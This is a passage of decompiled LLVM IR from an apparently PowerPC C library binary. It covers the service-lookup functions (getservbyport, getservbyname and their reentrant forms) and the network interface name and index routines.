  br i1 %v3_10024fa8, label %dec_label_pc_10024fc4, label %dec_label_pc_10024fb8

dec_label_pc_10024fb8:                            ; preds = %dec_label_pc_10024fa8
  store i32 1, i32* @global_var_10045264.1353, align 4
  br label %dec_label_pc_10024fc4

dec_label_pc_10024fc4:                            ; preds = %dec_label_pc_10024fa8, %dec_label_pc_10024fb8
  store i32 268586952, i32* @lr, align 4
  %v0_10024fc4 = call i32 @__pthread_cleanup_pop_restore()
  ret i32 %v0_10024fc4

; uselistorder directives
  uselistorder i32* @global_var_10045260.1345, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder label %dec_label_pc_10024fc4, { 1, 0 }
  uselistorder label %dec_label_pc_10024fa8, { 1, 0 }
}

define i32 @__GI_getservbyport_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32* %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg6 to i32
  store i32 %tmp, i32* @r8, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1004504c.1344 to i32), i32* %r29.global-to-local, align 4
  store i32 %arg1, i32* @r25, align 4
  %v2_10025000 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg4, i32* @r26, align 4
  store i32 %arg5, i32* @r27, align 4
  store i32 %tmp, i32* @r28, align 4
  %v4_1002501c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-56, i32 268527832, i32 ptrtoint (i32* @global_var_1004504c.1344 to i32))
  %v0_10025020 = load i32, i32* %r29.global-to-local, align 4
  store i32 268587048, i32* @lr, align 4
  %v1_10025024 = call i32 @pthread_mutex_lock(i32 %v0_10025020)
  %v3_1002502c = load i32, i32* @global_var_10045264.1353, align 4
  store i32 ptrtoint (i32* @global_var_10025034.1354 to i32), i32* @lr, align 4
  %v2_10025030 = call i32 @setservent(i32 %v3_1002502c, i32 268697600)
  br label %dec_label_pc_10025058

dec_label_pc_10025038:                            ; preds = %dec_label_pc_10025058
  %v0_10025038 = load i32, i32* @r31, align 4
  %v1_10025038 = add i32 %v0_10025038, 8
  %v2_10025038 = inttoptr i32 %v1_10025038 to i32*
  %v3_10025038 = load i32, i32* %v2_10025038, align 4
  %v1_1002503c = load i32, i32* @r25, align 4
  %v4_1002503c = icmp eq i32 %v3_10025038, %v1_1002503c
  br i1 %v4_1002503c, label %dec_label_pc_10025044, label %dec_label_pc_10025058

dec_label_pc_10025044:                            ; preds = %dec_label_pc_10025038
  br i1 %v3_10025074, label %dec_label_pc_1002507c, label %dec_label_pc_10025048

dec_label_pc_10025048:                            ; preds = %dec_label_pc_10025044
  %v1_10025048 = add i32 %v0_10025038, 12
  %v2_10025048 = inttoptr i32 %v1_10025048 to i32*
  %v3_10025048 = load i32, i32* %v2_10025048, align 4
  %v2_1002504c = inttoptr i32 %v3_10025048 to i8*
  %v3_1002504c = call i32 @__GI_strcoll(i8* %v2_1002504c, i32 %v0_1002506c)
  %v3_10025050 = icmp eq i32 %v3_1002504c, 0
  br i1 %v3_10025050, label %dec_label_pc_1002507c, label %dec_label_pc_10025058

dec_label_pc_10025058:                            ; preds = %dec_label_pc_10025038, %dec_label_pc_10025048, %entry
  %v0_10025058 = load i32, i32* @r26, align 4
  %v0_1002505c = load i32, i32* @r27, align 4
  %v0_10025060 = load i32, i32* @r28, align 4
  %v0_10025064 = load i32, i32* @r31, align 4
  store i32 268587116, i32* @lr, align 4
  %v4_10025068 = inttoptr i32 %v0_10025064 to i32*
  %v5_10025068 = call i32 @getservent_r(i32* %v4_10025068, i32 %v0_10025058, i32 %v0_1002505c, i32 %v0_10025060)
  %v0_1002506c = load i32, i32* @r30, align 4
  store i32 %v0_1002506c, i32* @r4, align 4
  store i32 %v5_10025068, i32* @r29, align 4
  %v3_10025070 = icmp eq i32 %v5_10025068, 0
  %v3_10025074 = icmp eq i32 %v0_1002506c, 0
  br i1 %v3_10025070, label %dec_label_pc_10025038, label %dec_label_pc_1002507c

dec_label_pc_1002507c:                            ; preds = %dec_label_pc_10025048, %dec_label_pc_10025044, %dec_label_pc_10025058
  %v3_10025080 = load i32, i32* @global_var_10045264.1353, align 4
  %v3_10025084 = icmp eq i32 %v3_10025080, 0
  br i1 %v3_10025084, label %dec_label_pc_1002508c, label %dec_label_pc_10025090

dec_label_pc_1002508c:                            ; preds = %dec_label_pc_1002507c
  store i32 ptrtoint ([3 x i8]* @global_var_10025090.1355 to i32), i32* @lr, align 4
  %v1_1002508c = call i32 @__GI_endservent(i32 268697600)
  br label %dec_label_pc_10025090

dec_label_pc_10025090:                            ; preds = %dec_label_pc_1002507c, %dec_label_pc_1002508c
  store i32 %v2_10025000, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268587164, i32* @lr, align 4
  %v0_10025098 = call i32 @__pthread_cleanup_pop_restore()
  %v0_1002509c = load i32, i32* @r28, align 4
  %v1_1002509c = inttoptr i32 %v0_1002509c to i32*
  %v2_1002509c = load i32, i32* %v1_1002509c, align 4
  %v2_100250a4 = icmp ne i32 %v2_1002509c, 0
  %v0_100250ac = load i32, i32* @r29, align 4
  %v2_100250ac = select i1 %v2_100250a4, i32 0, i32 %v0_100250ac
  ret i32 %v2_100250ac

; uselistorder directives
  uselistorder i32 %v0_1002506c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10025090, { 1, 0 }
  uselistorder label %dec_label_pc_1002507c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10025058, { 1, 0, 2 }
}

define i32 @__GI_getservbyport(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 %arg2, i32* @r28, align 4
  store i32 268587228, i32* @lr, align 4
  %v0_100250d8 = call i32 @__initbuf()
  %v3_100250e0 = load i32, i32* @global_var_1004525c.1343, align 4
  %v0_100250e8 = load i32, i32* @r29, align 4
  %v0_100250ec = load i32, i32* @r28, align 4
  store i32 268587264, i32* @lr, align 4
  %v8_100250fc = call i32 @__GI_getservbyport_r(i32 %v0_100250e8, i32 %v0_100250ec, i32 ptrtoint (i32* @global_var_1004db28.1351 to i32), i32 %v3_100250e0, i32 4237, i32* nonnull %stack_var_-40, i32 268697600)
  %v3_10025104 = load i32, i32* %stack_var_-40, align 4
  ret i32 %v3_10025104

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @getservbyname_r(i32 %arg1) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1004504c.1344 to i32), i32* %r29.global-to-local, align 4
  %v2_1002513c = ptrtoint i32* %stack_var_-56 to i32
  %v0_1002514c = load i32, i32* @r6, align 4
  store i32 %v0_1002514c, i32* @r24, align 4
  %v0_10025150 = load i32, i32* @r7, align 4
  store i32 %v0_10025150, i32* @r25, align 4
  %v0_10025154 = load i32, i32* @r8, align 4
  store i32 %v0_10025154, i32* @r27, align 4
  %v4_10025158 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-56, i32 268527832, i32 ptrtoint (i32* @global_var_1004504c.1344 to i32))
  %v0_1002515c = load i32, i32* %r29.global-to-local, align 4
  store i32 268587364, i32* @lr, align 4
  %v1_10025160 = call i32 @pthread_mutex_lock(i32 %v0_1002515c)
  %v3_10025168 = load i32, i32* @global_var_10045264.1353, align 4
  store i32 ptrtoint (i32* @global_var_10025170.1356 to i32), i32* @lr, align 4
  %v2_1002516c = call i32 @setservent(i32 %v3_10025168, i32 268697600)
  br label %dec_label_pc_100251d4

dec_label_pc_10025174:                            ; preds = %dec_label_pc_100251d4
  %v0_10025174 = load i32, i32* @r31, align 4
  %v1_10025174 = inttoptr i32 %v0_10025174 to i32*
  %v2_10025174 = load i32, i32* %v1_10025174, align 4
  store i32 %v2_10025174, i32* @r4, align 4
  %v0_10025178 = load i32, i32* @r28, align 4
  %v2_1002517c = inttoptr i32 %v0_10025178 to i8*
  %v3_1002517c = call i32 @__GI_strcoll(i8* %v2_1002517c, i32 %v2_10025174)
  %v3_10025180 = icmp eq i32 %v3_1002517c, 0
  br i1 %v3_10025180, label %dec_label_pc_100251b8, label %dec_label_pc_10025188

dec_label_pc_10025188:                            ; preds = %dec_label_pc_10025174
  %v0_10025188 = load i32, i32* @r31, align 4
  %v1_10025188 = add i32 %v0_10025188, 4
  %v2_10025188 = inttoptr i32 %v1_10025188 to i32*
  %v3_10025188 = load i32, i32* %v2_10025188, align 4
  store i32 %v3_10025188, i32* %r29.global-to-local, align 4
  %v1_1002519c5 = inttoptr i32 %v3_10025188 to i32*
  %v2_1002519c6 = load i32, i32* %v1_1002519c5, align 4
  %v0_100251a07 = load i32, i32* @r28, align 4
  %v1_100251a48 = add i32 %v3_10025188, 4
  store i32 %v1_100251a48, i32* @r29, align 4
  %v3_100251a811 = icmp eq i32 %v2_1002519c6, 0
  store i32 %v2_1002519c6, i32* @r4, align 4
  br i1 %v3_100251a811, label %dec_label_pc_100251d4, label %dec_label_pc_10025190

dec_label_pc_10025190:                            ; preds = %dec_label_pc_10025188, %dec_label_pc_10025190.dec_label_pc_1002519c_crit_edge
  %v0_100251a013 = phi i32 [ %v0_100251a0, %dec_label_pc_10025190.dec_label_pc_1002519c_crit_edge ], [ %v0_100251a07, %dec_label_pc_10025188 ]
  %v2_1002519c12 = phi i32 [ %v2_1002519c, %dec_label_pc_10025190.dec_label_pc_1002519c_crit_edge ], [ %v2_1002519c6, %dec_label_pc_10025188 ]
  %v2_10025190 = inttoptr i32 %v0_100251a013 to i8*
  %v3_10025190 = call i32 @__GI_strcoll(i8* %v2_10025190, i32 %v2_1002519c12)
  %v3_10025194 = icmp eq i32 %v3_10025190, 0
  br i1 %v3_10025194, label %dec_label_pc_100251b8, label %dec_label_pc_10025190.dec_label_pc_1002519c_crit_edge

dec_label_pc_10025190.dec_label_pc_1002519c_crit_edge: ; preds = %dec_label_pc_10025190
  %v0_1002519c.pre = load i32, i32* @r29, align 4
  %v1_1002519c = inttoptr i32 %v0_1002519c.pre to i32*
  %v2_1002519c = load i32, i32* %v1_1002519c, align 4
  %v0_100251a0 = load i32, i32* @r28, align 4
  %v1_100251a4 = add i32 %v0_1002519c.pre, 4
  store i32 %v1_100251a4, i32* @r29, align 4
  %v3_100251a8 = icmp eq i32 %v2_1002519c, 0
  store i32 %v2_1002519c, i32* @r4, align 4
  br i1 %v3_100251a8, label %dec_label_pc_100251d4, label %dec_label_pc_10025190

dec_label_pc_100251b8:                            ; preds = %dec_label_pc_10025190, %dec_label_pc_10025174
  %v0_100251b8 = load i32, i32* @r30, align 4
  %v3_100251b8 = icmp eq i32 %v0_100251b8, 0
  br i1 %v3_100251b8, label %dec_label_pc_100251f0, label %dec_label_pc_100251c0

dec_label_pc_100251c0:                            ; preds = %dec_label_pc_100251b8
  %v0_100251c0 = load i32, i32* @r31, align 4
  %v1_100251c0 = add i32 %v0_100251c0, 12
  %v2_100251c0 = inttoptr i32 %v1_100251c0 to i32*
  %v3_100251c0 = load i32, i32* %v2_100251c0, align 4
  store i32 %v0_100251b8, i32* @r4, align 4
  %v2_100251c8 = inttoptr i32 %v3_100251c0 to i8*
  %v3_100251c8 = call i32 @__GI_strcoll(i8* %v2_100251c8, i32 %v0_100251b8)
  %v3_100251cc = icmp eq i32 %v3_100251c8, 0
  br i1 %v3_100251cc, label %dec_label_pc_100251f0, label %dec_label_pc_100251d4

dec_label_pc_100251d4:                            ; preds = %dec_label_pc_10025188, %dec_label_pc_10025190.dec_label_pc_1002519c_crit_edge, %dec_label_pc_100251c0, %entry
  %v0_100251d4 = load i32, i32* @r31, align 4
  %v0_100251d8 = load i32, i32* @r24, align 4
  %v0_100251dc = load i32, i32* @r25, align 4
  %v0_100251e0 = load i32, i32* @r27, align 4
  store i32 268587496, i32* @lr, align 4
  %v4_100251e4 = inttoptr i32 %v0_100251d4 to i32*
  %v5_100251e4 = call i32 @getservent_r(i32* %v4_100251e4, i32 %v0_100251d8, i32 %v0_100251dc, i32 %v0_100251e0)
  store i32 %v5_100251e4, i32* @r26, align 4
  %v3_100251e8 = icmp eq i32 %v5_100251e4, 0
  br i1 %v3_100251e8, label %dec_label_pc_10025174, label %dec_label_pc_100251f0

dec_label_pc_100251f0:                            ; preds = %dec_label_pc_100251c0, %dec_label_pc_100251b8, %dec_label_pc_100251d4
  %v3_100251f4 = load i32, i32* @global_var_10045264.1353, align 4
  %v3_100251f8 = icmp eq i32 %v3_100251f4, 0
  br i1 %v3_100251f8, label %dec_label_pc_10025200, label %dec_label_pc_10025204

dec_label_pc_10025200:                            ; preds = %dec_label_pc_100251f0
  store i32 ptrtoint ([3 x i8]* @global_var_10025204.1357 to i32), i32* @lr, align 4
  %v1_10025200 = call i32 @__GI_endservent(i32 268697600)
  br label %dec_label_pc_10025204

dec_label_pc_10025204:                            ; preds = %dec_label_pc_100251f0, %dec_label_pc_10025200
  store i32 %v2_1002513c, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268587536, i32* @lr, align 4
  %v0_1002520c = call i32 @__pthread_cleanup_pop_restore()
  %v0_10025210 = load i32, i32* @r27, align 4
  %v1_10025210 = inttoptr i32 %v0_10025210 to i32*
  %v2_10025210 = load i32, i32* %v1_10025210, align 4
  %v2_10025218 = icmp ne i32 %v2_10025210, 0
  %v0_10025220 = load i32, i32* @r26, align 4
  %v2_10025220 = select i1 %v2_10025218, i32 0, i32 %v0_10025220
  ret i32 %v2_10025220

; uselistorder directives
  uselistorder i32 %v0_100251b8, { 1, 0, 2 }
  uselistorder i32 %v2_1002519c, { 1, 2, 0 }
  uselistorder i32 (i32)* @__GI_endservent, { 1, 0 }
  uselistorder i32 (i32, i32)* @setservent, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1004504c.1344 to i32), { 2, 7, 3, 8, 0, 4, 1, 5, 6, 9 }
  uselistorder label %dec_label_pc_10025204, { 1, 0 }
  uselistorder label %dec_label_pc_100251f0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100251d4, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10025190, { 1, 0 }
}

define i32 @getservbyname(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 %arg2, i32* @r28, align 4
  store i32 268587600, i32* @lr, align 4
  %v0_1002524c = call i32 @__initbuf()
  %v3_10025254 = load i32, i32* @global_var_1004525c.1343, align 4
  store i32 %v3_10025254, i32* @r6, align 4
  %v0_1002525c = load i32, i32* @r29, align 4
  %v0_10025260 = load i32, i32* @r28, align 4
  store i32 %v0_10025260, i32* @r4, align 4
  %v2_10025264 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10025264, i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_1004db28.1351 to i32), i32* @r5, align 4
  store i32 4237, i32* @r7, align 4
  store i32 268587636, i32* @lr, align 4
  %v4_10025270 = call i32 @getservbyname_r(i32 %v0_1002525c)
  %v3_10025278 = load i32, i32* %stack_var_-40, align 4
  ret i32 %v3_10025278

; uselistorder directives
  uselistorder i32 4237, { 2, 0, 1, 3 }
  uselistorder i32* @global_var_1004db28.1351, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1004db28.1351 to i32), { 1, 0 }
  uselistorder i32 ()* @__initbuf, { 2, 1, 0 }
}

define i32 @if_indextoname(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_10025290 = load i32, i32* @lr, align 4
  store i32 %v0_10025290, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @r30, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 268587688, i32* @lr, align 4
  %v0_100252a4 = call i32 @__opensock()
  store i32 %v0_100252a4, i32* @r3, align 4
  %v2_100252a8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v0_100252a4, i32* @r29, align 4
  %v1_100252ac = icmp slt i32 %v0_100252a4, 0
  store i32 35088, i32* @r4, align 4
  store i32 %v2_100252a8, i32* @r5, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v1_100252ac, label %dec_label_pc_10025320, label %dec_label_pc_100252c4

dec_label_pc_100252c4:                            ; preds = %entry
  store i32 268587728, i32* @lr, align 4
  %v0_100252cc = call i32 @ioctl()
  %tmp7 = icmp sgt i32 %v0_100252cc, -1
  br i1 %tmp7, label %dec_label_pc_10025308, label %dec_label_pc_100252dc

dec_label_pc_100252dc:                            ; preds = %dec_label_pc_100252c4
  %v0_100252dc = call i32 @__errno_location()
  %v1_100252e0 = inttoptr i32 %v0_100252dc to i32*
  %v2_100252e0 = load i32, i32* %v1_100252e0, align 4
  store i32 %v2_100252e0, i32* @r31, align 4
  store i32 %v0_100252dc, i32* %r30.global-to-local, align 4
  %v0_100252e8 = load i32, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_100252f0.1358 to i32), i32* @lr, align 4
  %v1_100252ec = call i32 @__libc_close(i32 %v0_100252e8)
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_100252f4 = load i32, i32* @r31, align 4
  %v3_100252f4 = icmp eq i32 %v0_100252f4, 19
  br i1 %v3_100252f4, label %dec_label_pc_100252fc, label %dec_label_pc_10025300

dec_label_pc_100252fc:                            ; preds = %dec_label_pc_100252dc
  br label %dec_label_pc_10025300

dec_label_pc_10025300:                            ; preds = %dec_label_pc_100252dc, %dec_label_pc_100252fc
  %v0_10025300 = phi i32 [ %v0_100252f4, %dec_label_pc_100252dc ], [ 6, %dec_label_pc_100252fc ]
  %v1_10025300 = load i32, i32* %r30.global-to-local, align 4
  %v2_10025300 = inttoptr i32 %v1_10025300 to i32*
  store i32 %v0_10025300, i32* %v2_10025300, align 4
  %v0_10025320.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10025320

dec_label_pc_10025308:                            ; preds = %dec_label_pc_100252c4
  %v0_100252d4 = load i32, i32* @r29, align 4
  store i32 268587788, i32* @lr, align 4
  %v1_10025308 = call i32 @__libc_close(i32 %v0_100252d4)
  %v0_1002530c = load i32, i32* @r30, align 4
  store i32 %v2_100252a8, i32* @r4, align 4
  store i32 268587804, i32* @lr, align 4
  %v3_10025318 = call i32 @strncpy(i32 %v0_1002530c, i32 %v2_100252a8, i32 16)
  store i32 %v3_10025318, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10025320

dec_label_pc_10025320:                            ; preds = %entry, %dec_label_pc_10025300, %dec_label_pc_10025308
  %v0_10025320 = phi i32 [ 0, %entry ], [ %v0_10025320.pre, %dec_label_pc_10025300 ], [ %v3_10025318, %dec_label_pc_10025308 ]
  store i32 %v0_10025290, i32* %r0.global-to-local, align 4
  ret i32 %v0_10025320

; uselistorder directives
  uselistorder i32 %v2_100252a8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10025320, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10025300, { 1, 0 }
}

define i32 @__GI_if_nametoindex(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 268587856, i32* @lr, align 4
  %v0_1002534c = call i32 @__opensock()
  store i32 %v0_1002534c, i32* @r31, align 4
  %v1_10025350 = icmp slt i32 %v0_1002534c, 0
  %v2_10025354 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10025354, i32* %r30.global-to-local, align 4
  %v0_10025358 = load i32, i32* @r29, align 4
  store i32 %v0_10025358, i32* @r4, align 4
  store i32 %v2_10025354, i32* %r3.global-to-local, align 4
  br i1 %v1_10025350, label %dec_label_pc_100253c8, label %dec_label_pc_10025368

dec_label_pc_10025368:                            ; preds = %entry
  store i32 268587884, i32* @lr, align 4
  %v3_10025368 = call i32 @strncpy(i32 %v2_10025354, i32 %v0_10025358, i32 16)
  %v0_10025370 = load i32, i32* @r31, align 4
  store i32 %v0_10025370, i32* @r3, align 4
  store i32 35123, i32* @r4, align 4
  store i32 %v2_10025354, i32* @r5, align 4
  store i32 268587908, i32* @lr, align 4
  %v0_10025380 = call i32 @ioctl()
  %v0_10025388 = load i32, i32* @r31, align 4
  store i32 %v0_10025388, i32* %r3.global-to-local, align 4
  %tmp6 = icmp sgt i32 %v0_10025380, -1
  br i1 %tmp6, label %dec_label_pc_100253bc, label %dec_label_pc_10025390

dec_label_pc_10025390:                            ; preds = %dec_label_pc_10025368
  %v0_10025390 = call i32 @__errno_location()
  store i32 %v0_10025390, i32* %r3.global-to-local, align 4
  %v1_10025394 = inttoptr i32 %v0_10025390 to i32*
  %v2_10025394 = load i32, i32* %v1_10025394, align 4
  store i32 %v2_10025394, i32* @r29, align 4
  store i32 %v0_10025390, i32* %r30.global-to-local, align 4
  %v0_1002539c = load i32, i32* @r31, align 4
  store i32 %v0_1002539c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100253a4.1359 to i32), i32* @lr, align 4
  %v1_100253a0 = call i32 @__libc_close(i32 %v0_1002539c)
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_100253a8 = load i32, i32* @r29, align 4
  %v3_100253a8 = icmp eq i32 %v0_100253a8, 22
  br i1 %v3_100253a8, label %dec_label_pc_100253b0, label %dec_label_pc_100253c8

dec_label_pc_100253b0:                            ; preds = %dec_label_pc_10025390
  %v1_100253b4 = load i32, i32* %r30.global-to-local, align 4
  %v2_100253b4 = inttoptr i32 %v1_100253b4 to i32*
  store i32 38, i32* %v2_100253b4, align 4
  %v0_100253dc.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100253cc

dec_label_pc_100253bc:                            ; preds = %dec_label_pc_10025368
  store i32 268587968, i32* @lr, align 4
  %v1_100253bc = call i32 @__libc_close(i32 %v0_10025388)
  store i32 %tmp, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100253cc

dec_label_pc_100253c8:                            ; preds = %dec_label_pc_10025390, %entry
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100253cc

dec_label_pc_100253cc:                            ; preds = %dec_label_pc_100253bc, %dec_label_pc_100253b0, %dec_label_pc_100253c8
  %v0_100253dc = phi i32 [ %tmp, %dec_label_pc_100253bc ], [ %v0_100253dc.pre, %dec_label_pc_100253b0 ], [ 0, %dec_label_pc_100253c8 ]
  ret i32 %v0_100253dc

; uselistorder directives
  uselistorder i32 %v2_10025354, { 1, 0, 2, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_100253cc, { 2, 0, 1 }
}

define i32 @__GI_if_nameindex() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100253e0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100253e0, i32* %stack_var_-64, align 4
  %v5_100253e0 = ptrtoint i32* %stack_var_-64 to i32
  %v0_100253e4 = load i32, i32* @lr, align 4
  store i32 %v0_100253e4, i32* %r0.global-to-local, align 4
  store i32 %v5_100253e0, i32* @r31, align 4
  store i32 268588024, i32* @lr, align 4
  %v0_100253f4 = call i32 @__opensock()
  store i32 %v0_100253f4, i32* @r26, align 4
  %v1_100253f8 = icmp slt i32 %v0_100253f4, 0
  store i32 0, i32* @r28, align 4
  br i1 %v1_100253f8, label %dec_label_pc_100255a0, label %dec_label_pc_10025404

dec_label_pc_10025404:                            ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 128, i32* @r30, align 4
  %v2_10025434 = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_10025410

dec_label_pc_10025410:                            ; preds = %dec_label_pc_10025470, %dec_label_pc_10025404
  %v0_10025410 = phi i32 [ 128, %dec_label_pc_10025404 ], [ %v3_10025470, %dec_label_pc_10025470 ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_10025404 ], [ %v1_10025440, %dec_label_pc_10025470 ]
  %v1_10025410 = mul i32 %v0_10025410, 2
  store i32 %v1_10025410, i32* %r11.global-to-local, align 4
  %v2_10025414 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_10025414, i32* %r9.global-to-local, align 4
  %v1_10025418 = add i32 %v1_10025410, 30
  store i32 %v1_10025418, i32* %r0.global-to-local, align 4
  %v1_10025420 = call i32 @__asm_rlwinm(i32 %v1_10025418, i32 0, i32 0, i32 27)
  store i32 35090, i32* @r4, align 4
  %v0_1002542c = load i32, i32* @r26, align 4
  store i32 %v0_1002542c, i32* @r3, align 4
  %v0_10025430 = load i32, i32* %r9.global-to-local, align 4
  %v1_10025430 = load i32, i32* @r1, align 4
  %v3_10025430 = sub i32 %v1_10025430, %v1_10025420
  %v4_10025430 = inttoptr i32 %v3_10025430 to i32*
  store i32 %v0_10025430, i32* %v4_10025430, align 4
  store i32 %v2_10025434, i32* @r5, align 4
  %v0_10025438 = load i32, i32* @r30, align 4
  %v1_10025438 = load i32, i32* %r11.global-to-local, align 4
  %v2_10025438 = add i32 %v1_10025438, %v0_10025438
  store i32 %v2_10025438, i32* @r30, align 4
  %v1_1002543c = add i32 %v3_10025430, 23
  store i32 %v1_1002543c, i32* %r0.global-to-local, align 4
  %v1_10025440 = call i32 @__asm_rlwinm(i32 %v1_1002543c, i32 0, i32 0, i32 27)
  store i32 %stack_var_-52.0, i32* %r0.global-to-local, align 4
  %v1_10025448 = load i32, i32* %r11.global-to-local, align 4
  %v2_10025448 = add i32 %v1_10025448, %v1_10025440
  store i32 %v2_10025448, i32* %r9.global-to-local, align 4
  %v4_1002544c = icmp eq i32 %v2_10025448, %stack_var_-52.0
  br i1 %v4_1002544c, label %dec_label_pc_10025410.dec_label_pc_10025458_crit_edge, label %dec_label_pc_10025454

dec_label_pc_10025410.dec_label_pc_10025458_crit_edge: ; preds = %dec_label_pc_10025410
  %v0_1002545c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10025458

dec_label_pc_10025454:                            ; preds = %dec_label_pc_10025410
  store i32 %v1_10025448, i32* @r30, align 4
  br label %dec_label_pc_10025458

dec_label_pc_10025458:                            ; preds = %dec_label_pc_10025410.dec_label_pc_10025458_crit_edge, %dec_label_pc_10025454
  %v0_1002545c = phi i32 [ %v0_1002545c.pre, %dec_label_pc_10025410.dec_label_pc_10025458_crit_edge ], [ %v1_10025448, %dec_label_pc_10025454 ]
  store i32 %v0_1002545c, i32* %stack_var_-56, align 4
  store i32 268588136, i32* @lr, align 4
  %v0_10025464 = call i32 @ioctl()
  %v1_10025468 = icmp slt i32 %v0_10025464, 0
  br i1 %v1_10025468, label %dec_label_pc_100254b4, label %dec_label_pc_10025470

dec_label_pc_10025470:                            ; preds = %dec_label_pc_10025458
  %v3_10025470 = load i32, i32* %stack_var_-56, align 4
  %v1_10025474 = load i32, i32* @r30, align 4
  %v4_10025474 = icmp eq i32 %v3_10025470, %v1_10025474
  br i1 %v4_10025474, label %dec_label_pc_10025410, label %dec_label_pc_1002547c

dec_label_pc_1002547c:                            ; preds = %dec_label_pc_10025470
  %v1_1002547c = udiv i32 %v3_10025470, 32
  store i32 %v1_1002547c, i32* %r24.global-to-local, align 4
  %v1_10025480 = mul nuw nsw i32 %v1_1002547c, 8
  %v1_10025484 = add nuw nsw i32 %v1_10025480, 8
  store i32 %v1_10025484, i32* @r3, align 4
  store i32 268588172, i32* @lr, align 4
  %v0_10025488 = call i32 @malloc()
  store i32 %v0_10025488, i32* @r28, align 4
  %v3_1002548c = icmp eq i32 %v0_10025488, 0
  br i1 %v3_1002548c, label %dec_label_pc_1002549c, label %dec_label_pc_10025494

dec_label_pc_10025494:                            ; preds = %dec_label_pc_1002547c
  store i32 0, i32* @r27, align 4
  %v1_1002557821 = load i32, i32* %r24.global-to-local, align 4
  %v2_1002557822 = icmp eq i32 %v1_1002557821, 0
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v0_10025488, i32* %r25.global-to-local, align 4
  br i1 %v2_1002557822, label %dec_label_pc_1002558c, label %dec_label_pc_100254c4

dec_label_pc_1002549c:                            ; preds = %dec_label_pc_1002547c
  %v0_1002549c = load i32, i32* @r26, align 4
  store i32 268588196, i32* @lr, align 4
  %v1_100254a0 = call i32 @__libc_close(i32 %v0_1002549c)
  %v0_100254a4 = call i32 @__errno_location()
  store i32 105, i32* %r0.global-to-local, align 4
  %v2_100254ac = inttoptr i32 %v0_100254a4 to i32*
  store i32 105, i32* %v2_100254ac, align 4
  br label %dec_label_pc_100255a0

dec_label_pc_100254b4:                            ; preds = %dec_label_pc_10025458
  %v0_100254b4 = load i32, i32* @r26, align 4
  store i32 0, i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_100254c0.1361 to i32), i32* @lr, align 4
  %v1_100254bc = call i32 @__libc_close(i32 %v0_100254b4)
  br label %dec_label_pc_100255a0

